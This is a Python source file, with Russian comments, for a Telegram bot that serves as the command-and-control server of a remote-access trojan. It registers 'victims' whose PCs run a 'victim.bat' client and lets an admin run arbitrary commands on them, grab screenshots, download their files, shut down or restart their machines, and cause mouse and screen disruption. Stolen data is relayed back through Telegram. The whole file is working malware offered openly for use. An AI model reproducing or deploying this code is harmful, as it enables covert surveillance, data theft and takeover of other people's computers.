import telebot
import os
import time
import subprocess
import sys

# ========== ПЕРЕМЕННЫЕ ИЗ ОКРУЖЕНИЯ ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_ID = os.environ.get("ADMIN_ID", "8788219303")

if not BOT_TOKEN:
    print("❌ ОШИБКА: BOT_TOKEN не задан в Variables")
    sys.exit(1)

try:
    ADMIN_ID = int(ADMIN_ID)
except:
    print(f"❌ ОШИБКА: ADMIN_ID должен быть числом, сейчас: {ADMIN_ID}")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# Хранилище активных жертв (ID -> информация)
victims = {}

print("🚀 Бот-сервер запущен на Railway")
print(f"📌 Bot token: {BOT_TOKEN[:10]}...")
print(f"👑 Admin ID: {ADMIN_ID}")

# ========== КОМАНДЫ ДЛЯ АДМИНА ==========
@bot.message_handler(commands=['start'])
def start_admin(message):
    if message.chat.id != ADMIN_ID:
        bot.reply_to(message, "❌ Доступ запрещён. Ты не админ.")
        return
    
    bot.reply_to(message, 
        "✅ **Бот-сервер управления ПК**\n\n"
        "📋 /list — список активных ПК жертв\n"
        "📸 /screenshot [ID] — запросить скриншот у жертвы\n"
        "💻 /cmd [ID] [команда] — выполнить команду\n"
        "📂 /get [ID] [путь] — скачать файл с ПК жертвы\n"
        "🔌 /shutdown [ID] — выключить ПК жертвы\n"
        "🔄 /restart [ID] — перезагрузить ПК жертвы\n"
        "🐭 /jitter [ID] — конвульсии мыши\n"
        "🎨 /glitch [ID] — глитч-эффект\n\n"
        "⚠️ Жертва должна запустить victim.bat на своём ПК\n"
        "📌 ID жертвы придёт в чат автоматически при подключении",
        parse_mode='Markdown')

@bot.message_handler(commands=['list'])
def list_victims(message):
    if message.chat.id != ADMIN_ID:
        return
    
    if not victims:
        bot.reply_to(message, "📭 Нет активных ПК жертв. Жди, пока кто-то запустит victim.bat")
        return
    
    msg = "🖥️ **Активные жертвы:**\n\n"
    for vid, info in victims.items():
        msg += f"🔹 ID: `{vid}`\n"
        msg += f"   📛 Хост: {info.get('hostname', 'Unknown')}\n"
        msg += f"   🌐 IP: {info.get('ip', 'Unknown')}\n"
        msg += f"   ⏰ Время: {info.get('time', 'Unknown')}\n\n"
    
    bot.reply_to(message, msg, parse_mode='Markdown')

@bot.message_handler(commands=['screenshot'])
def cmd_screenshot(message):
    if message.chat.id != ADMIN_ID:
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ Используй: /screenshot ID_жертвы\n\nСписок ID: /list")
        return
    
    victim_id = parts[1]
    if victim_id not in victims:
        bot.reply_to(message, f"❌ Жертва с ID `{victim_id}` не найдена. Используй /list", parse_mode='Markdown')
        return
    
    # Отправляем команду жертве
    victims[victim_id]['pending_cmd'] = 'SCREENSHOT'
    bot.reply_to(message, f"📸 Запрос скриншота отправлен жертве `{victim_id}`. Ожидай...", parse_mode='Markdown')

@bot.message_handler(commands=['cmd'])
def cmd_run(message):
    if message.chat.id != ADMIN_ID:
        return
    
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "❌ Используй: /cmd ID_жертвы команда\n\nПример: /cmd 5C4A-3F2B calc")
        return
    
    victim_id = parts[1]
    command = parts[2]
    
    if victim_id not in victims:
        bot.reply_to(message, f"❌ Жертва с ID `{victim_id}` не найдена", parse_mode='Markdown')
        return
    
    victims[victim_id]['pending_cmd'] = f'CMD:{command}'
    bot.reply_to(message, f"💻 Команда `{command}` отправлена жертве `{victim_id}`", parse_mode='Markdown')

@bot.message_handler(commands=['get'])
def cmd_get(message):
    if message.chat.id != ADMIN_ID:
        return
    
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "❌ Используй: /get ID_жертвы путь_к_файлу\n\nПример: /get 5C4A-3F2B C:\\Users\\Desktop\\file.txt")
        return
    
    victim_id = parts[1]
    filepath = parts[2]
    
    if victim_id not in victims:
        bot.reply_to(message, f"❌ Жертва с ID `{victim_id}` не найдена", parse_mode='Markdown')
        return
    
    victims[victim_id]['pending_cmd'] = f'GET:{filepath}'
    bot.reply_to(message, f"📂 Запрос файла `{filepath}` отправлен жертве `{victim_id}`", parse_mode='Markdown')

@bot.message_handler(commands=['shutdown'])
def cmd_shutdown(message):
    if message.chat.id != ADMIN_ID:
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ Используй: /shutdown ID_жертвы")
        return
    
    victim_id = parts[1]
    if victim_id not in victims:
        bot.reply_to(message, f"❌ Жертва с ID `{victim_id}` не найдена", parse_mode='Markdown')
        return
    
    victims[victim_id]['pending_cmd'] = 'SHUTDOWN'
    bot.reply_to(message, f"🔌 Выключение ПК `{victim_id}` через 5 секунд", parse_mode='Markdown')

@bot.message_handler(commands=['restart'])
def cmd_restart(message):
    if message.chat.id != ADMIN_ID:
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ Используй: /restart ID_жертвы")
        return
    
    victim_id = parts[1]
    if victim_id not in victims:
        bot.reply_to(message, f"❌ Жертва с ID `{victim_id}` не найдена", parse_mode='Markdown')
        return
    
    victims[victim_id]['pending_cmd'] = 'RESTART'
    bot.reply_to(message, f"🔄 Перезагрузка ПК `{victim_id}` через 5 секунд", parse_mode='Markdown')

@bot.message_handler(commands=['jitter'])
def cmd_jitter(message):
    if message.chat.id != ADMIN_ID:
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ Используй: /jitter ID_жертвы")
        return
    
    victim_id = parts[1]
    if victim_id not in victims:
        bot.reply_to(message, f"❌ Жертва с ID `{victim_id}` не найдена", parse_mode='Markdown')
        return
    
    victims[victim_id]['pending_cmd'] = 'JITTER'
    bot.reply_to(message, f"🐭 Конвульсии мыши включены на ПК `{victim_id}`", parse_mode='Markdown')

@bot.message_handler(commands=['glitch'])
def cmd_glitch(message):
    if message.chat.id != ADMIN_ID:
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ Используй: /glitch ID_жертвы")
        return
    
    victim_id = parts[1]
    if victim_id not in victims:
        bot.reply_to(message, f"❌ Жертва с ID `{victim_id}` не найдена", parse_mode='Markdown')
        return
    
    victims[victim_id]['pending_cmd'] = 'GLITCH'
    bot.reply_to(message, f"🎨 Глитч-эффект запущен на ПК `{victim_id}`", parse_mode='Markdown')

# ========== ОБРАБОТЧИК СООБЩЕНИЙ ОТ ЖЕРТВ ==========
@bot.message_handler(func=lambda m: True)
def handle_victim_message(message):
    chat_id = str(message.chat.id)
    
    # Если это админ — игнорируем (уже обработано в командах)
    if message.chat.id == ADMIN_ID:
        return
    
    # Новая жертва?
    if chat_id not in victims:
        victims[chat_id] = {
            'hostname': message.text if len(message.text) < 50 else 'Unknown',
            'ip': 'Unknown',
            'time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'pending_cmd': None
        }
        
        # Отправляем админу уведомление о новой жертве
        bot.send_message(
            ADMIN_ID,
            f"🆕 **НОВАЯ ЖЕРТВА ПОДКЛЮЧИЛАСЬ!**\n\n"
            f"🆔 ID: `{chat_id}`\n"
            f"💬 Сообщение: {message.text[:100]}\n"
            f"⏰ Время: {victims[chat_id]['time']}",
            parse_mode='Markdown'
        )
        
        # Отправляем инструкцию жертве
        bot.reply_to(message, "✅ Ты подключён к серверу управления. Ожидай команд от администратора.")
        return
    
    # Проверяем, есть ли ожидающая команда для этой жертвы
    if victims[chat_id].get('pending_cmd'):
        cmd = victims[chat_id]['pending_cmd']
        victims[chat_id]['pending_cmd'] = None
        
        # Если жертва прислала результат выполнения команды
        if message.text and message.text.startswith('RESULT:'):
            result = message.text[7:]
            bot.send_message(ADMIN_ID, f"📊 **Результат от жертвы {chat_id}:**\n```\n{result[:3000]}\n```", parse_mode='Markdown')
        elif message.text and message.text.startswith('ERROR:'):
            error = message.text[6:]
            bot.send_message(ADMIN_ID, f"❌ **Ошибка от жертвы {chat_id}:**\n```\n{error[:1000]}\n```", parse_mode='Markdown')
        else:
            # Простое сообщение
            bot.send_message(ADMIN_ID, f"💬 Сообщение от жертвы {chat_id}:\n{message.text[:500]}")
    
    # Если прислали фото (скриншот)
    elif message.photo:
        bot.send_photo(
            ADMIN_ID, 
            message.photo[-1].file_id, 
            caption=f"📸 **СКРИНШОТ ОТ ЖЕРТВЫ**\n🆔 ID: `{chat_id}`\n⏰ {time.strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode='Markdown'
        )
    
    # Если прислали документ (файл)
    elif message.document:
        bot.send_document(
            ADMIN_ID,
            message.document.file_id,
            caption=f"📁 **ФАЙЛ ОТ ЖЕРТВЫ**\n🆔 ID: `{chat_id}`\n📛 Имя: {message.document.file_name}",
            parse_mode='Markdown'
        )
    
    # Обычное текстовое сообщение от жертвы
    else:
        bot.send_message(ADMIN_ID, f"💬 Жертва {chat_id}:\n{message.text[:500]}")

# ========== ЗАПУСК ==========
if __name__ == "__main__":
    print("🚀 Бот запущен!")
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print(f"⚠️ Ошибка: {e}")
            time.sleep(5)
